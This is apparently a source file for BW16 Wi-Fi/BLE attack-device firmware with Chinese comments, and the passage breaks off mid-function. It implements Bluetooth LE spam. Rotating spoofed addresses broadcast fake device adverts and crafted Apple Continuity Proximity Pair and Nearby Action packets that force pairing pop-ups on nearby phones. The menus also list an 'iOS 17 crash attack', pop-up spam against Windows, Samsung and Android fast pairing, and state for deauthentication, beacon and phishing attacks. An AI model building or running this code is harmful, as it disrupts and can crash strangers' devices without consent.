// 启动时强制重置所有状态（修复重启后问题）
static void performStartupStateReset() {
  // 先初始化显示并显示初始化信息
  Serial.println("0. 初始化显示系统...");
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 init failed"));
    while (true);
  }
  u8g2_for_adafruit_gfx.begin(display);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_ncenB14_tr);
  
  // 显示"..."
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  
  const char* initText = "...";
  int textWidth = u8g2_for_adafruit_gfx.getUTF8Width(initText);
  int x = (display.width() - textWidth) / 2;
  if (x < 0) x = 0;
  u8g2_for_adafruit_gfx.setCursor(x, 32);
  u8g2_for_adafruit_gfx.print(initText);
  display.display();
  
  Serial.println("1. 重置BLE状态变量...");
  g_bleResourcesInUse = false;
  g_bleActiveAdvertising = false;
  g_lastBleActivity = 0;
  
  Serial.println("2. 清理WiFi扫描结果...");
  scan_results.clear();
  scan_results.shrink_to_fit(); // 释放内存
  SelectedVector.clear();
  SelectedVector.shrink_to_fit();
  selectedFlags.clear();
  selectedFlags.shrink_to_fit();
  g_scanDone = false;
  
  Serial.println("3. 重置Web服务状态...");
  web_ui_active = false;
  web_test_active = false;
  web_server_active = false;
  dns_server_active = false;
  g_webTestLocked = false;  // 允许钓鱼功能重复启动
  g_webUILocked = false;     // Web UI保持一次性限制
  
  Serial.println("4. 重置攻击状态...");
  deauthAttackRunning = false;
  beaconAttackRunning = false;
  attackstate = 0;
  becaonstate = 0;
  g_attackDetectRunning = false;
  g_packetDetectRunning = false;
  
  Serial.println("5. 强制WiFi硬件重置...");
  wifi_off();
  delay(500); // 增加延时确保完全关闭
  wifi_on(RTW_MODE_AP);
  delay(500); // 增加延时确保完全启动
  
  Serial.println("6. 清理内存碎片...");
  // 强制垃圾回收（如果平台支持）
  delay(100);
  
  Serial.println("启动状态重置完成");
}

// Handle rate control UI and return true if rate changed
static bool handleBlePopupRateControl() {
  static unsigned long lastBleUpTime = 0, lastBleDownTime = 0;
  unsigned long now = millis();
  bool rateChanged = false;
  
  // Handle UP button - decrease delay (increase rate)
  if (digitalRead(BTN_UP) == LOW && (now - lastBleUpTime > 300)) {
    lastBleUpTime = now;
    if (g_blePopupRateIndex > 0) {
      g_blePopupRateIndex--;
      rateChanged = true;
    }
  }
  
  // Handle DOWN button - increase delay (decrease rate)  
  if (digitalRead(BTN_DOWN) == LOW && (now - lastBleDownTime > 300)) {
    lastBleDownTime = now;
    if (g_blePopupRateIndex < BLE_RATE_COUNT - 1) {
      g_blePopupRateIndex++;
      rateChanged = true;
    }
  }
  
  return rateChanged;
}

// Common BLE popup display with rate control
static void drawBlePopupDisplay(const char* title) {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  oledDrawCenteredLine(title, 12);
  String rateStr = "速率と延时: " + String(getBlePopupDelay()) + "ms";
  oledDrawCenteredLine(rateStr.c_str(), 28);
  oledDrawCenteredLine("UP/DOWN调节", 44);
  oledDrawCenteredLine("BACK 返回", 56);
  display.display();
}

// Common BLE popup rate control handler for main loop
static bool handleBlePopupMainLoop(const char* title, unsigned long& lastDisplayUpdate) {
  if (digitalRead(BTN_BACK) == LOW) { 
    delay(200); 
    return true; // Exit
  }
  
  // Handle rate control and update display only if rate changed
  bool rateChanged = handleBlePopupRateControl();
  unsigned long now = millis();
  // 减少刷新频率，避免闪烁：只在速率改变时刷新，或者每3秒刷新一次
  if (rateChanged || (now - lastDisplayUpdate > 3000)) {
    drawBlePopupDisplay(title);
    lastDisplayUpdate = now;
  }
  
  return false; // Continue
}

// Common BLE popup rate control handler for delay loop
static bool handleBlePopupDelayLoop(const char* title, unsigned long& lastDisplayUpdate) {
  if (digitalRead(BTN_BACK) == LOW) return true; // Exit delay loop
  
  // Check for rate control during delay - 只在速率改变时刷新屏幕
  if (handleBlePopupRateControl()) {
    drawBlePopupDisplay(title);
    lastDisplayUpdate = millis();
  }
  
  return false; // Continue delay
}

// BLE headset-like advertising test
void bleHeadsetTest() {
  // OLED UI: show status
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  oledDrawCenteredLine("[蓝牙信标发送]", 25);
  oledDrawCenteredLine("按BACK退出", 50);
  display.display();

  // 标记BLE资源开始使用
  g_bleResourcesInUse = true;
  g_bleActiveAdvertising = false; // 初始状态
  g_lastBleActivity = millis();

  // Initialize BLE and configure non-connectable advertising
  BLE.init();
  BLE.setDeviceName("按摩震动棒");
  BLE.setDeviceAppearance(GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE);

  BLE.configAdvert()->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
  BLE.configAdvert()->setMinInterval(80);  // 50ms
  BLE.configAdvert()->setMaxInterval(160); // 100ms

  // Start peripheral mode (advertising only, non-connectable)
  BLE.beginPeripheral();

  // Generate a pool of STATIC random addresses (减少内存使用)
  const uint8_t maxClones = 20; // 从10减少到20以节省内存
  static uint8_t addrPool[maxClones][6];
  for (uint8_t i = 0; i < maxClones; i++) {
    if (le_gen_rand_addr(GAP_RAND_ADDR_STATIC, addrPool[i]) != GAP_CAUSE_SUCCESS) {
      le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, addrPool[i]);
    }
  }
  // Ensure advertising uses RANDOM local address type
  uint8_t local_bd_type = GAP_LOCAL_ADDR_LE_RANDOM;
  le_adv_set_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, sizeof(local_bd_type), &local_bd_type);

  const uint16_t perCloneMs = 80; // 减少切换延时，提高切换速度
  uint8_t idx = 0;

  while (true) {
    if (digitalRead(BTN_BACK) == LOW) { delay(200); break; }

    // Stop current advertising to switch address and name
    BLE.configAdvert()->stopAdv();

    // Set next address from pool
    le_set_rand_addr(addrPool[idx]);
    delay(20);

    // Build advert payloads
    BLEAdvertData cadv; BLEAdvertData cscn;
    cadv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
    char namebuf[24];
    snprintf(namebuf, sizeof(namebuf), "按摩震动棒");
    cadv.addCompleteName(namebuf);
    cadv.addAppearance(GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE);
    cadv.addCompleteServices(BLEUUID("1812"));
    uint8_t mfg[8]; uint16_t company = 0xFFFF;
    mfg[0] = 7; mfg[1] = 0xFF; mfg[2] = (uint8_t)(company & 0xFF); mfg[3] = (uint8_t)(company >> 8);
    mfg[4] = idx; mfg[5] = addrPool[idx][3]; mfg[6] = addrPool[idx][4]; mfg[7] = addrPool[idx][5];
    cadv.addData(mfg, sizeof(mfg));
    cscn.addAppearance(GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE);
    BLE.configAdvert()->setAdvData(cadv);
    BLE.configAdvert()->setScanRspData(cscn);
    BLE.configAdvert()->updateAdvertParams();

    // Restart advertising
    BLE.configAdvert()->startAdv();

    unsigned long start = millis();
    while (millis() - start < perCloneMs) { if (digitalRead(BTN_BACK) == LOW) break; delay(10); }
    idx = (uint8_t)((idx + 1) % maxClones);
  }

  // Stop BLE and clean up resources
  Serial.println("停止BLE广播并清理资源...");
  BLE.configAdvert()->stopAdv();
  g_bleActiveAdvertising = false;
  delay(100);
  BLE.deinit();
  g_bleResourcesInUse = false;
  g_lastBleActivity = millis();
  Serial.println("BLE资源清理完成");
}

// ===== Generic BLE Menu System Implementation =====
void showGenericBleMenu(const char* /* title */, const BleMenuItem* items, int itemCount) {
  static int g_genericBleState = 0;
  static int g_genericBleStartIndex = 0;
  
  const int ITEM_H = 16;
  const int Y_OFF = 2;
  const int MAX_DISPLAY_ITEMS = 4;
  
  // 重置选择状态
  g_genericBleState = 0;
  g_genericBleStartIndex = 0;
  
  unsigned long lastUpTime = 0, lastDownTime = 0, lastOkTime = 0, lastBackTime = 0;
  
  while (true) {
    unsigned long now = millis();
    
    // 处理BACK按键
    if (digitalRead(BTN_BACK) == LOW) {
      if (now - lastBackTime > DEBOUNCE_DELAY) {
        lastBackTime = now;
        // 等待按键释放，避免主循环立即检测到返回键
        while(digitalRead(BTN_BACK) == LOW) { delay(10); }
        return;
      }
    }
    
    // 处理OK按键
    if (digitalRead(BTN_OK) == LOW) {
      if (now - lastOkTime > DEBOUNCE_DELAY) {
        lastOkTime = now;
        stabilizeButtonState();
        
        int selIndex = g_genericBleStartIndex + g_genericBleState;
        if (selIndex >= 0 && selIndex < itemCount && items[selIndex].action) {
          items[selIndex].action();
        }
        // 不要return，继续菜单循环
      }
    }
    
    // 处理UP按键
    if (digitalRead(BTN_UP) == LOW) {
      if (now - lastUpTime > DEBOUNCE_DELAY) {
        if (g_genericBleState > 0) {
          int yFrom = Y_OFF + g_genericBleState * ITEM_H;
          g_genericBleState--;
          int yTo = Y_OFF + g_genericBleState * ITEM_H;
          animateGenericBleMenu(yFrom, yTo, 14, items, itemCount, g_genericBleStartIndex);
        } else if (g_genericBleStartIndex > 0) {
          g_genericBleStartIndex--;
          int yFrom = Y_OFF + 1 * ITEM_H;
          int yTo = Y_OFF + 0 * ITEM_H;
          g_genericBleState = 0;
          animateGenericBleMenu(yFrom, yTo, 14, items, itemCount, g_genericBleStartIndex);
        }
        lastUpTime = now;
      }
    }
    
    // 处理DOWN按键
    if (digitalRead(BTN_DOWN) == LOW) {
      if (now - lastDownTime > DEBOUNCE_DELAY) {
        if (g_genericBleState < MAX_DISPLAY_ITEMS - 1 && (g_genericBleStartIndex + g_genericBleState) < itemCount - 1) {
          int yFrom = Y_OFF + g_genericBleState * ITEM_H;
          g_genericBleState++;
          int yTo = Y_OFF + g_genericBleState * ITEM_H;
          animateGenericBleMenu(yFrom, yTo, 14, items, itemCount, g_genericBleStartIndex);
        } else if ((g_genericBleStartIndex + MAX_DISPLAY_ITEMS) < itemCount) {
          g_genericBleStartIndex++;
          int yFrom = Y_OFF + (MAX_DISPLAY_ITEMS - 2) * ITEM_H;
          int yTo = Y_OFF + (MAX_DISPLAY_ITEMS - 1) * ITEM_H;
          g_genericBleState = MAX_DISPLAY_ITEMS - 1;
          animateGenericBleMenu(yFrom, yTo, 14, items, itemCount, g_genericBleStartIndex);
        }
        lastDownTime = now;
      }
    }
    
    // 主绘制循环 - 完全按照原始代码的方式
    display.clearDisplay();
    drawGenericBleMenuBase(items, itemCount, g_genericBleStartIndex);
    int rectY = Y_OFF + g_genericBleState * ITEM_H;
    display.drawRoundRect(0, rectY - 2, display.width(), 14, 2, SSD1306_WHITE);
    display.display();
    delay(40);
  }
}

static void drawGenericBleMenuBase(const BleMenuItem* items, int itemCount, int startIndex) {
  display.clearDisplay();
  const int ITEM_H = 16;
  const int Y_OFF = 2;
  const int MAX_DISPLAY_ITEMS = 4;
  
  // 完全按照原始蓝牙弹窗菜单的方式绘制
  for (int i = 0; i < MAX_DISPLAY_ITEMS && (startIndex + i) < itemCount; i++) {
    int yPos = Y_OFF + i * ITEM_H;
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, yPos + 10);
    u8g2_for_adafruit_gfx.print(items[startIndex + i].label);
    drawRightChevron(yPos - 2, 14, false);
  }
}

static void animateGenericBleMenu(int yFrom, int yTo, int rectHeight, const BleMenuItem* items, int itemCount, int startIndex) {
  // 完全按照原始动画代码
  const int delayPerStepMs = SELECT_MOVE_TOTAL_MS / ANIM_STEPS;
  const int width = display.width();
  unsigned long nextStepDeadline = millis() + delayPerStepMs;
  
  for (int s = 1; s <= ANIM_STEPS; s++) {
    int y = yFrom + ((yTo - yFrom) * s) / ANIM_STEPS;
    drawGenericBleMenuBase(items, itemCount, startIndex);
    display.drawRoundRect(0, y, width, rectHeight, 2, SSD1306_WHITE);
    if ((s % DISPLAY_FLUSH_EVERY_FRAMES) == 0 || s == ANIM_STEPS) display.display();
    while ((long)(millis() - nextStepDeadline) < 0) { }
    nextStepDeadline += delayPerStepMs;
  }
}

// ===== Enhanced BLE Beacon Device Menu =====

void bleBeaconDeviceMenu() {
  // 定义信标设备菜单项
  static const BleMenuItem beaconMenuItems[] = {
    {"广播:Apple全家桶", bleBeaconAppleAction},
    {"广播:小米全家桶", bleBeaconXiaomiAction},
    {"广播:华为全家桶", bleBeaconHuaweiAction},
    {"广播:Google全家桶", bleBeaconGoogleAction},
    {"广播:米家大杂烩", bleBeaconMixedAction},
    {"广播:罕见设备", bleBeaconMiscAction},
    {"广播:儿童玩具", bleBeaconToyAction}
  };
  static const int beaconMenuCount = sizeof(beaconMenuItems) / sizeof(beaconMenuItems[0]);
  
  showGenericBleMenu("", beaconMenuItems, beaconMenuCount);
}

// BLE信标设备类别回调函数实现
void bleBeaconAppleAction() {
  if (showConfirmModal("启动Apple设备广播")) {
    bleBeaconBroadcast(BLE_CATEGORY_APPLE);
  }
}

void bleBeaconXiaomiAction() {
  if (showConfirmModal("启动小米设备广播")) {
    bleBeaconBroadcast(BLE_CATEGORY_XIAOMI);
  }
}

void bleBeaconToyAction() {
  if (showConfirmModal("启动玩具设备广播")) {
    bleBeaconBroadcast(BLE_CATEGORY_TOY);
  }
}

void bleBeaconHuaweiAction() {
  if (showConfirmModal("启动华为设备广播")) {
    bleBeaconBroadcast(BLE_CATEGORY_HUAWEI);
  }
}

void bleBeaconGoogleAction() {
  if (showConfirmModal("启动Google设备广播")) {
    bleBeaconBroadcast(BLE_CATEGORY_GOOGLE);
  }
}

void bleBeaconMiscAction() {
  if (showConfirmModal("启动罕见设备广播")) {
    bleBeaconBroadcast(BLE_CATEGORY_MISC);
  }
}

void bleBeaconMixedAction() {
  if (showConfirmModal("启动米家大杂烩广播")) {
    bleBeaconBroadcast(BLE_CATEGORY_MIXED);
  }
}

// ===== Enhanced BLE Beacon Broadcast Function =====
void bleBeaconBroadcast(BleDeviceCategory category) {
  const BleBeaconDevice* devices = nullptr;
  int deviceCount = 0;
  const char* categoryName = "";
  
  // 根据类别选择设备数组
  switch (category) {
    case BLE_CATEGORY_APPLE:
      devices = g_appleDevices;
      deviceCount = g_appleDeviceCount;
      categoryName = "Apple全家桶";
      break;
    case BLE_CATEGORY_XIAOMI:
      devices = g_xiaomiDevices;
      deviceCount = g_xiaomiDeviceCount;
      categoryName = "小米全家桶";
      break;
    case BLE_CATEGORY_TOY:
      devices = g_toyDevices;
      deviceCount = g_toyDeviceCount;
      categoryName = "儿童玩具";
      break;
    case BLE_CATEGORY_HUAWEI:
      devices = g_huaweiDevices;
      deviceCount = g_huaweiDeviceCount;
      categoryName = "华为全家桶";
      break;
    case BLE_CATEGORY_GOOGLE:
      devices = g_googleDevices;
      deviceCount = g_googleDeviceCount;
      categoryName = "Google全家桶";
      break;
    case BLE_CATEGORY_MIXED:
      devices = g_mixedDevices;
      deviceCount = g_mixedDeviceCount;
      categoryName = "米家大杂烩";
      break;
    case BLE_CATEGORY_MISC:
      devices = g_miscDevices;
      deviceCount = g_miscDeviceCount;
      categoryName = "罕见设备";
      break;
    default:
      return;
  }
  
  // OLED UI: 显示状态
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  oledDrawCenteredLine("[蓝牙信标发送]", 12);
  
  char statusBuf[32];
  snprintf(statusBuf, sizeof(statusBuf), "广播: %s", categoryName);
  oledDrawCenteredLine(statusBuf, 26);
  oledDrawCenteredLine("按BACK退出", 60);
  display.display();

  // 标记BLE资源开始使用
  g_bleResourcesInUse = true;
  g_bleActiveAdvertising = false; // 初始状态
  g_lastBleActivity = millis();

  // 初始化BLE并配置非连接广播 - 优化广播频率
  BLE.init();
  BLE.setDeviceName("BW16-BLE");
  BLE.setDeviceAppearance(GAP_GATT_APPEARANCE_GENERIC_COMPUTER);

  BLE.configAdvert()->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
  BLE.configAdvert()->setMinInterval(20);  // 优化：从50ms减少到20ms
  BLE.configAdvert()->setMaxInterval(40);  // 优化：从120ms减少到40ms

  // 启动外围模式（仅广播，不可连接）
  BLE.beginPeripheral();

  // 生成静态随机地址池 - 增加地址数量提高多样性
  const uint8_t maxClones = 32; // 优化：从32增加到64
  static uint8_t addrPool[maxClones][6];
  for (uint8_t i = 0; i < maxClones; i++) {
    if (le_gen_rand_addr(GAP_RAND_ADDR_STATIC, addrPool[i]) != GAP_CAUSE_SUCCESS) {
      le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, addrPool[i]);
    }
  }
  
  // 确保广播使用随机本地地址类型
  uint8_t local_bd_type = GAP_LOCAL_ADDR_LE_RANDOM;
  le_adv_set_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, sizeof(local_bd_type), &local_bd_type);

  // 优化：减少切换延时，提高切换速度
  const uint16_t perCloneMs = 50; // 优化：从100ms减少到50ms
  uint8_t addrIdx = 0;
  
  // 优化：创建设备索引数组，实现真正的随机化避免连续相同设备
  static int deviceIndices[64]; // 增加数组大小支持更多设备
  int maxDeviceIndices = std::min(64, deviceCount * 8); // 每个设备重复8次，增加多样性
  
  // 初始化设备索引数组，确保每个设备都有足够的重复
  for (int i = 0; i < maxDeviceIndices; i++) {
    deviceIndices[i] = i % deviceCount;
  }
  
  // 使用改进的Fisher-Yates洗牌算法，确保真正的随机分布
  for (int i = maxDeviceIndices - 1; i > 0; i--) {
    int j = random(0, i + 1);
    int temp = deviceIndices[i];
    deviceIndices[i] = deviceIndices[j];
    deviceIndices[j] = temp;
  }
  
  // 额外验证：确保相邻设备不重复
  for (int i = 1; i < maxDeviceIndices; i++) {
    if (deviceIndices[i] == deviceIndices[i-1]) {
      // 如果发现重复，与后面的设备交换
      for (int j = i + 1; j < maxDeviceIndices; j++) {
        if (deviceIndices[j] != deviceIndices[i-1]) {
          int temp = deviceIndices[i];
          deviceIndices[i] = deviceIndices[j];
          deviceIndices[j] = temp;
          break;
        }
      }
    }
  }
  
  int deviceArrayIdx = 0;
  
  unsigned long lastDisplayUpdate = 0;
  const unsigned long displayUpdateInterval = 300; // 优化：减少显示更新间隔

  while (true) {
    if (digitalRead(BTN_BACK) == LOW) { 
      delay(200); 
      break; 
    }

    // 停止当前广播以切换地址和设备信息
    BLE.configAdvert()->stopAdv();

    // 从池中设置下一个地址
    le_set_rand_addr(addrPool[addrIdx]);
    delay(5); // 优化：从20ms减少到5ms

    // 构建广播载荷
    BLEAdvertData cadv;
    BLEAdvertData cscn;
    
    // 优化：使用智能设备选择算法，避免连续相同设备
    int deviceIdx = deviceIndices[deviceArrayIdx];
    
    // 额外检查：如果当前设备与前一个相同，尝试选择不同的设备
    static int lastDeviceIdx = -1;
    if (deviceIdx == lastDeviceIdx && deviceCount > 1) {
      // 尝试从当前索引开始找到下一个不同的设备
      for (int i = 1; i < maxDeviceIndices; i++) {
        int nextIdx = (deviceArrayIdx + i) % maxDeviceIndices;
        if (deviceIndices[nextIdx] != lastDeviceIdx) {
          deviceIdx = deviceIndices[nextIdx];
          deviceArrayIdx = nextIdx; // 更新索引位置
          break;
        }
      }
    }
    lastDeviceIdx = deviceIdx;
    
    const BleBeaconDevice& currentDevice = devices[deviceIdx];
    
    cadv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
    
    // 添加设备名称（完整名称，必要时通过调整附加字段确保包长）
    char namebuf[32];
    snprintf(namebuf, sizeof(namebuf), "%s", currentDevice.name);
    
    cadv.addCompleteName(namebuf);
    cadv.addAppearance(currentDevice.appearance);
    // 为保证名称不被截断，优先移除可选字段以控制包大小
    // 仅当名称较长时才添加完整服务UUID到扫描响应包
    cscn.addCompleteServices(BLEUUID(currentDevice.service_uuid));
    
    // 将制造商数据移动到扫描响应，避免挤占广播包导致名称截断
    uint8_t mfg[8];
    mfg[0] = 7;
    mfg[1] = 0xFF;
    mfg[2] = (uint8_t)(currentDevice.company_id & 0xFF);
    mfg[3] = (uint8_t)(currentDevice.company_id >> 8);
    mfg[4] = deviceIdx;
    mfg[5] = addrPool[addrIdx][3];
    mfg[6] = addrPool[addrIdx][4];
    mfg[7] = addrPool[addrIdx][5];
    cscn.addData(mfg, sizeof(mfg));
    
    cscn.addAppearance(currentDevice.appearance);
    
    BLE.configAdvert()->setAdvData(cadv);
    BLE.configAdvert()->setScanRspData(cscn);
    BLE.configAdvert()->updateAdvertParams();

    // 重新启动广播
    BLE.configAdvert()->startAdv();
    
    // 更新显示（定期仅刷新设备名称区域，避免其他文字闪烁）
    unsigned long now = millis();
    if (now - lastDisplayUpdate >= displayUpdateInterval) {
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      // 清除名称行所在区域再绘制（不清整屏），扩大清除高度防止重叠
      display.fillRect(0, 32, display.width(), 20, SSD1306_BLACK);
      oledDrawCenteredLine(namebuf, 44);
      display.display();
      lastDisplayUpdate = now;
    }

    // 等待指定时间
    unsigned long start = millis();
    while (millis() - start < perCloneMs) { 
      if (digitalRead(BTN_BACK) == LOW) break; 
      delay(5); // 优化：从10ms减少到5ms
    }
    
    // 切换到下一个地址和设备
    addrIdx = (uint8_t)((addrIdx + 1) % maxClones);
    deviceArrayIdx = (deviceArrayIdx + 1) % maxDeviceIndices;
    
    // 优化：每轮结束后重新随机化设备顺序，使用改进的算法
    if (deviceArrayIdx == 0) {
      // 使用改进的Fisher-Yates洗牌算法
      for (int i = maxDeviceIndices - 1; i > 0; i--) {
        int j = random(0, i + 1);
        int temp = deviceIndices[i];
        deviceIndices[i] = deviceIndices[j];
        deviceIndices[j] = temp;
      }
      
      // 额外验证：确保相邻设备不重复
      for (int i = 1; i < maxDeviceIndices; i++) {
        if (deviceIndices[i] == deviceIndices[i-1]) {
          // 如果发现重复，与后面的设备交换
          for (int j = i + 1; j < maxDeviceIndices; j++) {
            if (deviceIndices[j] != deviceIndices[i-1]) {
              int temp = deviceIndices[i];
              deviceIndices[i] = deviceIndices[j];
              deviceIndices[j] = temp;
              break;
            }
          }
        }
      }
    }
  }

  // 停止BLE并清理资源
  Serial.println("停止BLE广播并清理资源...");
  BLE.configAdvert()->stopAdv();
  g_bleActiveAdvertising = false;
  delay(100);
  BLE.deinit();
  g_bleResourcesInUse = false;
  g_lastBleActivity = millis();
  Serial.println("BLE资源清理完成");
}

// Common BLE init helper - 优化广播频率
static void bleEnsureInitAndParams() {
  // 标记BLE资源开始使用
  g_bleResourcesInUse = true;
  g_bleActiveAdvertising = false; // 初始状态
  g_lastBleActivity = millis();
  
  BLE.init();
  BLE.setDeviceName("BW16-BLE");
  BLE.configAdvert()->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
  BLE.configAdvert()->setMinInterval(20);  // 优化：从40ms减少到20ms
  BLE.configAdvert()->setMaxInterval(40);  // 优化：从60ms减少到40ms
  BLE.beginPeripheral();
  uint8_t local_bd_type = GAP_LOCAL_ADDR_LE_RANDOM;
  le_adv_set_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, sizeof(local_bd_type), &local_bd_type);
}

void blePopupMenu() {
  // 定义弹窗功能菜单项
  static const BleMenuItem popupMenuItems[] = {
    {"iOS 设备配对弹窗", blePopupStart_iOS},
    {"iOS Action Modal", blePopupStart_iOSActionModal},
    {"iOS 17 崩溃攻击", blePopupStart_iOS17Crash},
    {"Windows Swift Pair", blePopupStart_WindowsSwiftPair},
    {"三星EasySetup", blePopupStart_SamsungEasySetup},
    {"↓部分设备有效↓", blePopupShowFastPairInfo},
    {"Google快速配对", blePopupStart_AndroidFastPair},
    {"小米/红米快速配对", blePopupStart_XiaomiFastPair},
    {"一加快速配对", blePopupStart_OnePlusFastPair},
    {"华为快速配对", blePopupStart_HuaweiFastPair},
    {"OPPO快速配对", blePopupStart_OppoFastPair},
    {"realme快速配对", blePopupStart_RealmeFastPair}
  };
  static const int popupMenuCount = sizeof(popupMenuItems) / sizeof(popupMenuItems[0]);
  
  showGenericBleMenu("", popupMenuItems, popupMenuCount);
}

// iOS popup
// Apple Proximity Pair devices (from fl-BLE_SPAM)
void blePopupStart_iOS() {
  const char* title = "[iOS 设备配对弹窗]";
  drawBlePopupDisplay(title);

  bleEnsureInitAndParams();

  // Apple device models for Proximity Pair
  const uint16_t appleModels[] = {
    0x0E20, // AirPods Pro
    0x0620, // Beats Solo 3
    0x0A20, // AirPods Max
    0x1020, // Beats Flex
    0x0055, // Airtag
    0x0030, // Hermes Airtag
    0x0220, // AirPods
    0x0F20, // AirPods 2nd Gen
    0x1320, // AirPods 3rd Gen
    0x1420, // AirPods Pro 2nd Gen
    0x0320, // Powerbeats 3
    0x0B20, // Powerbeats Pro
    0x0C20, // Beats Solo Pro
    0x1120, // Beats Studio Buds
    0x0520, // Beats X
    0x0920, // Beats Studio 3
    0x1720, // Beats Studio Pro
    0x1220, // Beats Fit Pro
    0x1620, // Beats Studio Buds+
  };
  const size_t modelCount = sizeof(appleModels) / sizeof(appleModels[0]);

  const uint8_t maxClones = 24; // 优化：从12增加到24提高多样性
  static uint8_t addrPool[maxClones][6];
  for (uint8_t i = 0; i < maxClones; i++) {
    if (le_gen_rand_addr(GAP_RAND_ADDR_STATIC, addrPool[i]) != GAP_CAUSE_SUCCESS) {
      le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, addrPool[i]);
    }
  }

  uint8_t idx = 0;
  unsigned long lastDisplayUpdate = 0;
  
  while (true) {
    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;

    BLE.configAdvert()->stopAdv();
    le_set_rand_addr(addrPool[idx]);
    delay(2); // 优化：减少切换延时

    // Build Apple Continuity Proximity Pair packet
    uint16_t model = appleModels[random(0, modelCount)];
    uint8_t prefix = (model == 0x0055 || model == 0x0030) ? 0x05 : 0x01;
    
    uint8_t packet[31];
    uint8_t i = 0;
    
    packet[i++] = 30; // Size
    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
    packet[i++] = 0x4C; // Company ID (Apple, Inc.)
    packet[i++] = 0x00; // ...
    packet[i++] = 0x07; // Continuity Type (Proximity Pair)
    packet[i++] = 25; // Continuity Size
    packet[i++] = prefix; // Prefix (paired 0x01 new 0x07 airtag 0x05)
    packet[i++] = (model >> 8) & 0xFF; // Model high byte
    packet[i++] = model & 0xFF; // Model low byte
    packet[i++] = 0x55; // Status
    packet[i++] = ((random(0, 10) << 4) + random(0, 10)); // Buds Battery Level
    packet[i++] = ((random(0, 8) << 4) + random(0, 10)); // Charging Status and Battery Case Level
    packet[i++] = random(0, 256); // Lid Open Counter
    packet[i++] = 0x00; // Device Color
    packet[i++] = 0x00;
    // Encrypted Payload (16 bytes random)
    for (int j = 0; j < 16; j++) {
      packet[i++] = random(0, 256);
    }

    BLEAdvertData adv;
    adv.addData(packet, 31);
    BLE.configAdvert()->setAdvData(adv);
    BLE.configAdvert()->setScanRspData(adv);
    BLE.configAdvert()->updateAdvertParams();
    BLE.configAdvert()->startAdv();

    unsigned long start = millis();
    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
    while (millis() - start < currentDelay) { 
      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
      delay(5); // 优化：从10ms减少到5ms
    }
    idx = (uint8_t)((idx + 1) % maxClones);
  }
  performCompleteBleCleanup();
}

// iOS Action Modal (from fl-BLE_SPAM)
void blePopupStart_iOSActionModal() {
  const char* title = "[iOS Action Modal]";
  drawBlePopupDisplay(title);

  bleEnsureInitAndParams();

  // Action types from fl-BLE_SPAM
  const uint8_t actions[] = {
    0x13, // AppleTV AutoFill
    0x27, // AppleTV Connecting...
    0x20, // Join This AppleTV?
    0x19, // AppleTV Audio Sync
    0x1E, // AppleTV Color Balance
    0x09, // Setup New iPhone
    0x02, // Transfer Phone Number
    0x0B, // HomePod Setup
    0x01, // Setup New AppleTV
    0x06, // Pair AppleTV
    0x0D, // HomeKit AppleTV Setup
    0x2B, // AppleID for AppleTV?
  };
  const size_t actionCount = sizeof(actions) / sizeof(actions[0]);

  unsigned long lastDisplayUpdate = 0;
  
  while (true) {
    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;

    BLE.configAdvert()->stopAdv();
    uint8_t rnd[6]; 
    le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); 
    le_set_rand_addr(rnd);

    // Build Apple Continuity Nearby Action packet
    uint8_t action = actions[random(0, actionCount)];
    uint8_t flag = 0xC0;
    
    // Special flag handling from fl-BLE_SPAM
    if (action == 0x20 && random(0, 2)) flag--; // More spam for 'Join This AppleTV?'
    if (action == 0x09 && random(0, 2)) flag = 0x40; // Glitched 'Setup New Device'
    
    uint8_t packet[11];
    uint8_t i = 0;
    
    packet[i++] = 10; // Size
    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
    packet[i++] = 0x4C; // Company ID (Apple, Inc.)
    packet[i++] = 0x00; // ...
    packet[i++] = 0x0F; // Continuity Type (Nearby Action)
    packet[i++] = 5; // Continuity Size
    packet[i++] = flag; // Action Flags
    packet[i++] = action; // Action Type
    // Authentication Tag (3 bytes random)
    packet[i++] = random(0, 256);
    packet[i++] = random(0, 256);
    packet[i++] = random(0, 256);

    BLEAdvertData adv;
    adv.addData(packet, 11);
    BLE.configAdvert()->setAdvData(adv);
    BLE.configAdvert()->setScanRspData(adv);
    BLE.configAdvert()->updateAdvertParams();
    BLE.configAdvert()->startAdv();

